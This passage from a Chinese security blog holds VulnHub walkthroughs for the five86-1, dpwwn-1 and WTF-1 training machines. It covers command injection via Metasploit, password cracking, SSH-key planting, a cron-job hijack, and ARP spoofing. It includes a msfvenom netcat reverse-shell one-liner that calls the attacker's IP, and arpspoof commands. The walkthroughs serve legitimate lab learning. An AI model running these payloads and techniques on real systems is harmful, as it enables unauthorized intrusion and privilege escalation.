(CODE:200|SIZE:29)                                                                                                                                                        </span><br><span class="line">+ http://192.168.1.134/server-status (CODE:403|SIZE:278)                                                                                                                                                                                                       </span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure><p>其中打开 <code>robots.txt</code> 文件后发现隐藏了这个目录：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/988.png" alt="图片"></p><p>接着访问刚刚获取到的隐藏目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.134/ona/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/989.png" alt="图片"></p><h2 id="OpenNetAdmin-命令注入获取SHELL"><a href="#OpenNetAdmin-命令注入获取SHELL" class="headerlink" title="OpenNetAdmin-命令注入获取SHELL"></a>OpenNetAdmin-命令注入获取SHELL</h2><p>打开后发现它是由 <code>OpenNetAdmin</code> （一个 IP 网络系统和主机管理系统）<code>CMS</code>，搜索了一下他的漏洞发现有一个<code>命令注入</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/990.png" alt="图片"></p><p>随后我在 <code>exploit-db.com</code> 网站上找到了一个可以让 <code>Metasploit</code> 利用的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/47772</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/991.png" alt="图片"></p><p>下载完之后呢，我把他的 <code>Payload</code> 移动到 <code>MSF</code> 的利用模块目录里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/992.png" alt="图片"></p><p>这个时候打开 <code>msfconsole</code> 就可以直接加载这个模块,设置攻击目标和攻击主机后直接运行得到一枚会话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/47772</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/993.png" alt="图片"></p><p>获取到 <code>shell</code> 之后，我来到家目录发现了一个 <code>.htpasswd</code> 文件，打开后有一个账号和加密的密码，还有一段作者的提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@five86-1:~$ cat .htpasswd</span><br><span class="line">cat .htpasswd</span><br><span class="line">douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1</span><br><span class="line"></span><br><span class="line"># To make things slightly less painful (a standard dictionary will likely fail),</span><br><span class="line"># use the following character set for this 10 character password: aefhrt </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/994.png" alt="图片"></p><p>通过提示，靶机作者想让我们通过暴力破解的方式去枚举密码，而提示说密码是10个字符，其中包含字母 <code>aefhrt</code> ！</p><h2 id="crunch-生成爆破字典"><a href="#crunch-生成爆破字典" class="headerlink" title="crunch-生成爆破字典"></a>crunch-生成爆破字典</h2><p>这个时候我们就需要使用 <code>KALI</code> 下的 <code>crunch</code> 去生成一个字典文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 aefhrt &gt; dic.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/995.png" alt="图片"></p><h2 id="john-爆破密码"><a href="#john-爆破密码" class="headerlink" title="john-爆破密码"></a>john-爆破密码</h2><p>随后使用 <code>john</code> 破解密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=dic.txt pass</span><br><span class="line"># 使用john破解pass文件，字典是dic.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/996.png" alt="图片"></p><p>经过漫长的破解，最后破解成功后密码为：<code>fatherrrrr</code> !</p><p>拿到密码后 <code>ssh</code> 登陆它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">douglas：fatherrrrr</span><br><span class="line">ssh douglas@192.168.1.134</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/997.png" alt="图片"></p><h2 id="sudo-cp命令切换用户"><a href="#sudo-cp命令切换用户" class="headerlink" title="sudo-cp命令切换用户"></a>sudo-cp命令切换用户</h2><p>登陆之后我通过 <code>sudo -l</code> （习惯）发现可以以 <code>jen</code> 用户去执行 <code>cp</code> 命令（很明显了，作者就是想让我们登陆到 jen 这个用户才能完成靶机）：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/998.png" alt="图片"></p><p>这个时候我们就可以先通过 <code>ssh-keygen</code> 来生成一个密钥，随后将生成的公钥拷贝到 <code>/home/jen/.ssh</code> ,这样就可以让我们登陆到 <code>jen</code> 这个用户！</p><p>其实这种方式我之前的文章也写过，大家到我博客翻就可以找到～</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -b 2048</span><br><span class="line"># 生成 2048 比特字节的密钥</span><br><span class="line"></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line"># 把生成的公钥复制到 /tmp/ 目录下并命名为：authorized_keys</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/999.png" alt="图片"></p><p>这个时候我们来到 <code>/tmp</code>（临时目录）下给 <code>authorized_keys</code> 这个文件一个可执行权限，然后使用 <code>sudo</code> 以 <code>jen</code> 用户权限去执行 <code>cp</code> 命令，把我们刚刚生成的 <code>authorized_keys</code> 移动到 <code>/home/jen/.ssh/</code> 目录下，这样我们才能登陆它～</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 authorized_keys</span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1000.png" alt="图片"></p><p>切换到 <code>jen</code> 用户后，我疯狂翻目录模式找到了一份邮件信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">From roy@five86-1 Wed Jan 01 03:17:00 2020</span><br><span class="line">Return-path: &lt;roy@five86-1&gt;</span><br><span class="line">Envelope-to: jen@five86-1</span><br><span class="line">Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">Received: from roy by five86-1 with local (Exim 4.92)</span><br><span class="line">        (envelope-from &lt;roy@five86-1&gt;)</span><br><span class="line">        id 1imZBc-0001FU-El</span><br><span class="line">        for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">To: jen@five86-1</span><br><span class="line">Subject: Monday Moss</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1imZBc-0001FU-El@five86-1&gt;</span><br><span class="line">From: Roy Trenneman &lt;roy@five86-1&gt;</span><br><span class="line">Date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line"></span><br><span class="line">Hi Jen,</span><br><span class="line"></span><br><span class="line">As you know, I&#x27;ll be on the &quot;customer service&quot; course on Monday due to that incident on Level 4 with the accounts people.</span><br><span class="line"></span><br><span class="line">But anyway, I had to change Moss&#x27;s password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!</span><br><span class="line"></span><br><span class="line">Moss will understand (ha ha ha ha).</span><br><span class="line"></span><br><span class="line">Tanks,</span><br><span class="line">Roy</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1001.png" alt="图片"></p><p>其中邮件的内容包含了一个用户的账号和密码，我们使用得到的账号和密码登陆到了 <code>ssh</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER：moss</span><br><span class="line">PASS：Fire!Fire!</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1002.png" alt="图片"></p><p>登陆之后通过查看那些文件有 <code>SUID</code> 权限后发现有一个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">moss@five86-1:~$ find /home -type f -perm -u=s 2&gt;/dev/null</span><br><span class="line">/home/moss/.games/upyourgame</span><br></pre></td></tr></table></figure><p><code>SUID</code> 具体可以看看这篇文章：<a href="https://www.cnblogs.com/sparkdev/p/9651622.html">https://www.cnblogs.com/sparkdev/p/9651622.html</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1003.png" alt="图片"></p><p>接着切换到那个文件的目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home/moss/.games/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1004.png" alt="图片"></p><p>最后运行 <code>upyourgame</code> 文件依次输入 <code>yes</code>、<code>no</code> 获取到 <code>root</code> 权限，最终在 <code>/root/</code> 目录下拿到 Flag～</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1005.png" alt="图片"></p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-dpwwn_1-Walkthrough，定时任务反弹SHELL拿到Flag</title>
      <link href="/2020/02/11/Vulnhub-dpwwn-1/"/>
      <url>/2020/02/11/Vulnhub-dpwwn-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=505688656&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这个靶场和我之前玩的 <code>Born2root&#39;s</code> 有点类似，都是通过定时任务反弹shll</p><p>Name：dpwwn: 1<br>靶机地址：<a href="https://www.vulnhub.com/entry/dpwwn-1,342/">https://www.vulnhub.com/entry/dpwwn-1,342/</a><br>靶机介绍：<br>This boot2root is a linux based virtual machine and has been tested using VMware workstation 14.<br>The network interface of VM will take it’s IP settings from DHCP (Network Mode: NAT).<br>Goal: Gain the root privilege and obtain the content of dpwwn-01-FLAG.txt under /root Directory.<br>Note: Tested on VMware workstation 14.<br>Difficulty: Easy/helpful for beginners.</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>靶机 IP : <code>192.168.1.135</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.135</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/973.png" alt="图片"></p><p>使用 <code>NMAP</code> 进行端口探测发现靶机开放了 <code>22</code>、<code>80</code>、<code>3306</code> 端口，先从 <code>http</code> 下手看看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.135</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/974.png" alt="图片"></p><p>在 <code>web</code> 页面上没有得到可利用的信息，只是得到了靶机的中简介为 <code>Apache</code> ，网站绝对路径有可能是：<code>/var/www/html/</code> , 接下来对它进行目录扫描看看有没有泄露一些铭感信息或者文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.135</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/975.png" alt="图片"></p><p>打开 <code>info.php</code> 后发现了是网站的 <code>phpinfo</code> 页面，其中网站绝对路径为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCUMENT_ROOT： /var/www/html </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/976.png" alt="图片"></p><p>从 <code>web</code> 页面中没找到突破点，接下来换到 <code>3306</code>（Mysql） 服务上，尝试看看能不能登陆到它的 <code>Mysql</code> 数据库（空密码）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.1.135 -u root -p</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/977.png" alt="图片"></p><p><code>Mysql</code> 未授权登陆成功之后，发现 <code>ssh</code> 数据库里有一个 <code>users</code> 表，里面是一个用户的账号密码信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [ssh]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password            <span class="operator">|</span>                                                                                                                                                                      </span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+---------------------+                                                                                                                                                                      </span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> mistic   <span class="operator">|</span> testP@$$swordmistic <span class="operator">|</span>                                                                                                                                                                      </span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+---------------------+ </span></span><br></pre></td></tr></table></figure><p>这个时候我们尝试看看能不能登陆到它的 <code>ssh</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mistic@192.168.1.135</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/978.png" alt="图片"></p><p>成功登陆到 <code>ssh</code> ，接下来就是一系列提权操作！</p><h2 id="定时任务反弹shell提权"><a href="#定时任务反弹shell提权" class="headerlink" title="定时任务反弹shell提权"></a>定时任务反弹shell提权</h2><p>通过查看<code>定时任务</code>发现了一个文件是每<code>三</code>分钟以 <code>root</code> 用户去运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/979.png" alt="图片"></p><p>文件名为 <code>logrot.sh</code> ，既然是 <code>bash</code> 脚本文件那么我就先利用 <code>MSF</code> 生成一个 <code>Payload</code> 用于 <code>Netcat</code> 反弹 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.128 LPORT=4444 R</span><br><span class="line">注释：R参数是个万能参数，既可以用在php上，也可以用在exe上等等。如果你后期还要对payload进行多次的编辑，那么建议你使用R参数 。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/980.png" alt="图片"></p><p>生成得到的 <code>Payload</code> 为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/fzxvc; nc 192.168.1.128 4444 0&lt;/tmp/fzxvc | /bin/sh &gt;/tmp/fzxvc 2&gt;&amp;1; rm /tmp/fzxvc</span><br></pre></td></tr></table></figure><p>我首先新建了一个文件 <code>1</code> ，然后把 <code>MSF</code> 生成的 <code>Payload</code> Copy 到文件 <code>1</code> 里面，接着使用 <code>cat</code> 命令和管道来把内容传到 <code>logrot.sh</code> 文件里：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/981.png" alt="图片"></p><p>这个时候 KALI <code>Netcat</code> 监听 <code>4444</code> 端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/982.png" alt="图片"></p><p>最终也是在 <code>root</code> 目录下拿到 <code>dpwwn-01-FLAG.txt</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/983.png" alt="图片"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次靶机挺简单的，主要还是要掌握 <code>Linux</code> 定时任务反弹 <code>SHELL</code> 这个操作！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub通关日记-WTF_1-Walkthrough，MITM中间人攻击拿到Flag</title>
      <link href="/2020/02/11/Vulnhub-WTF-1/"/>
      <url>/2020/02/11/Vulnhub-WTF-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=470795330&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/940.png" alt="图片"></p><p>Name：WTF:1<br>靶机地址：<a href="https://www.vulnhub.com/entry/wtf-1,399/">https://www.vulnhub.com/entry/wtf-1,399/</a><br>Level：intermediate machine<br>Task：拿到 <code>/root/flag.txt</code> 文件<br>其中作者给了我们一点提示：Remember, good enumeration!（意思就是告诉我们要用枚举爆破）<br>注意：我在玩这个靶机的时候用了两天，其中配置网络原因导致本文章的靶场IP变换了几次，从最初的<code>192.168.0.15</code>再到<code>192.168.1.130</code>，大家明白就好！</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机的第一时间先探测一下靶机的 <code>IP</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/941.png" alt="图片"></p><p>获取到靶机到 <code>IP</code> 为 <code>192.168.0.15</code> ，接下来使用 <code>NMAP</code> 对 <code>IP</code> 进行端口探测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.0.15</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/942.png" alt="图片"></p><p>发现它开放了 <code>22</code>（ssh）和 <code>80</code>（http）端口，入侵点有点少，估计就在 <code>80</code> 端口了。打开它的 <code>web</code> 页面没有啥可利用的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.15/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/943.png" alt="图片"></p><p>那么还是老规矩，扫一扫它的目录文件来看看：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/944.png" alt="图片"></p><p>发现了一个 <code>zhkh</code> 的目录，打开非常卡，而且发现它的请求是 <code>192.168.1.13</code> 这个 <code>ip</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.15/zhkh/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/945.png" alt="图片"></p><p>等了 N 久之后发现页面是乱的，估计是网络问题没有加载完：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/946.png" alt="图片"></p><p>通过问组长 <code>Ins1ght</code> 大佬说可以使用 <code>Burpsuite</code> 里的 <code>Options</code> 设置可以替换掉我们代理的 <code>192.168.0.15</code> 这个靶场 <code>IP</code>，因为返回包里提示了这个：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/947.png" alt="图片"></p><p>所以我们利用 <code>Burpsuite</code> 把它替换为 <code>192.168.1.13</code> ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/948.png" alt="图片"></p><p>这个时候我们再来访问网站就会很快了而且返回的页面是正常的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/949.png" alt="图片"></p><p>翻了一下页面发现它的 CMS 是 <code>Wordpress</code>，接着拿 <code>Wpscan</code> 一顿梭哈，发现了它的版本是 <code>Wordpress5.3</code>，而且没有啥可利用点：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/950.png" alt="图片"></p><p> 那么继续信息搜集，用 <code>gobuster</code> 扫它的目录文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir --url http://192.168.0.15/zhkh/wp-content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php,.txt,.html,.zip,.rar</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/951.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">===============================================================</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/themes (Status: 301)</span><br><span class="line">/uploads (Status: 301)</span><br><span class="line">/plugins (Status: 301)</span><br><span class="line">/upgrade (Status: 301)</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p> 其他文件没啥用，有用的就是 <code>/uploads</code> 这个目录，打开后是一个目录遍历：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/952.png" alt="图片"></p><p>我们来到 <code>uigen_2019</code> 这个目录下发现有一个 <code>shell.php</code> 文件引起了我的注意：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/953.png" alt="图片"></p><p>通过 <code>Burpsuite</code> 抓包发现响应包有错误信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARNING: Failed to daemonise.  This is quite common and not fatal.</span><br><span class="line">Connection timed out (110)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/954.png" alt="图片"></p><p>后来通过去 Google 搜索了一下 <code>Response</code> 发现了这个：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/955.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/956.png" alt="图片"></p><h2 id="wireShark捕获脚本木马信息"><a href="#wireShark捕获脚本木马信息" class="headerlink" title="wireShark捕获脚本木马信息"></a>wireShark捕获脚本木马信息</h2><p>通过大致的看了看代码它使用的是<code>反向</code>连接的 <code>shell</code>，也就是我们监听一个端口和IP，目标运行 <code>shell.php</code> 这个文件，然后我们就得到了一枚shell，这就是反向。</p><p>但是问题来了，我们不知道这个 <code>shell.php</code> 里的端口和 <code>IP</code> 是多少。这个时候我问了一下组长它说让我使用 <code>wireShark</code> 抓包分析一下然后利用 <code>MITM</code>（中间人攻击）。</p><p>那么先用 <code>wireShark</code> 抓包分析一下 <code>eth0</code> 这个网卡的流量吧，打开 <code>wireShark</code> 后捕获到一个有关于靶机（192.168.0.15）的 <code>TCP</code> 数据包：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/957.png" alt="图片"></p><p>这个流量的意思是这样的：<code>wireShark</code> 捕获到靶机（192.168.0.15）这个<code>源IP</code> 地址向 <code>Destination</code>（192.168.1.14）目的 IP 地址发送<code>TCP</code>请求。通过查看这条数据包发现源端口是 <code>51234</code>，目的端口是 <code>5555</code>。</p><p>因此分析后得知我们需要让我们的 <code>IP</code> 变为 <code>192.168.1.14</code>，然后监听 <code>5555</code> 端口就可以得到一枚 <code>shell</code>！</p><h2 id="MITM中间人ARP攻击得到shell"><a href="#MITM中间人ARP攻击得到shell" class="headerlink" title="MITM中间人ARP攻击得到shell"></a>MITM中间人ARP攻击得到shell</h2><p>有关<code>ARP</code>和<code>MITM</code>的文章可以看看这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/LittleHann/p/3735816.html</span><br><span class="line">https://www.cnblogs.com/LittleHann/p/3735602.html</span><br></pre></td></tr></table></figure><p>这个时候就可以利用 <code>ARP</code> 欺骗来告诉靶机（192.168.1.130）我 <code>KALI</code> 这台主机的 <code>IP</code> 为 <code>192.168.1.14</code>，从而利用 <code>ARP</code> 协议让 KALI 的 <code>MAC</code> 地址和 <code>192.168.1.14</code> 相同，造成这么一个 <code>ARP</code> 欺骗！</p><p>我先是在我KALI中添加了一个新的网卡：<code>eth1</code>，然后只设置它的<code>IP</code>、<code>子网掩码</code>、网关不需要设置：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/958.png" alt="图片"></p><p>设置好后重启网络发现多了一个网卡 <code>eth1</code> ，其中<code>IP</code>为<code>192.168.1.14</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/959.png" alt="图片"></p><p>这个时候再配置 KALI 的 <code>IP</code> 转发功能，把 <code>ip_forward</code> 的默认值 <code>0</code> 修改为 <code>1</code>:</p><p>然后 <code>nc</code> 监听 <code>5555</code> 端口、访问 <code>shell.php</code> ，随后进行 <code>arp</code> 欺骗攻击得到一枚<code>shell</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.1.130 192.168.1.14</span><br><span class="line">注释：-i 指定网卡 -t 要arp欺骗的ip，第一个IP是告诉目标IP我们kali的IP为192.168.1.14</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/960.png" 